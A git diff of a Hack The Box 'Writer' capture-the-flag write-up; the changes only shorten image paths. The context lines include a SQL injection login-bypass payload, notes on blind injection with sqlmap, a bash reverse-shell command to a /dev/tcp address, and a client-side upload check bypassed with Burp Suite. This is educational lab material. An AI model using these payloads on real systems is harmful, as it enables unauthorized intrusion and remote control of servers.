@@ -117,7 +117,7 @@ It can be assumed then that we need credentials to access this share and that gu
 
 Since it has HTTP running, lets just navigate to the site real quick:
 
-![The Writer Site](images/htbwriter/writersite.png)
+![The Writer Site](writersite.png)
 
 ### GoBuster
 
@@ -154,7 +154,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 Based on this, `/dashboard` is most likely behind a login, but `/administrative` looks the most promising.  Navigating there presents us with a login field:
 
-![The Login](images/htbwriter/login.png)
+![The Login](login.png)
 
 ### SQL Injection
 
@@ -235,11 +235,11 @@ uname=admin'+OR+1+AND+'wrdL'%3d'wrdL&password=admin
 
 When this post request is sent through burpsuite, we are presented with the following page:
 
-![Admin Redirect](images/htbwriter/admin.png)
+![Admin Redirect](admin.png)
 
 Which then redirects us to the dashboard:
 
-![Admin Dashboard](images/htbwriter/dashboard.png)
+![Admin Dashboard](dashboard.png)
 
 Now if you notice in the top corner of this page, it actually displays the query that we sent via the POST request.  I discovered after I had completed the box that you can actually get the output of your query on the Admin Redirect page which will prevent you from needing to do blind SQL injection.  But alas, I did not realize this and so I will show you the blind SQL injection that I did using sqlmap.
 
@@ -640,7 +640,7 @@ local_filename, headers = urllib.request.urlretrieve(image_url)
 
 Looking at the page rendered on the site, we see the following:
 
-![Edit post](images/htbwriter/edit.png)
+![Edit post](edit.png)
 
 So we can either upload an image, or give a URL to upload from.  Further research on the function which makes the `local_filename` variable shows that it produces a random temporary filename intended for one time use, but if it is pointed at a local file through the `file://` directive and the file exists, it simply returns the path to the file rather than making a copy of the file.  Now the code also has checks to make sure that the image is valid, but when looking further at the code, these checks only exist for the URL upload files and not the file upload option.  Instead, the file upload simply performs the following check:
 ```python
@@ -669,7 +669,7 @@ bash -i >& /dev/tcp/10.10.10.10/3939 0>&1
 
 We are then able to upload the malicious file, and then also verify it exists by navigating to the `/static/img` path of the website which will show us all the files.  Then when we go to execute the payload by referencing the file through the `file://` directive, we are given the following by the website:
 
-![Upload failure](images/htbwriter/special.png)
+![Upload failure](special.png)
 
 While this seems to have foiled our evil scheme, it is actually only a client side validation, so disabling this via inspect element or sending the payload via burpsuite bypasses this check entirely.
 
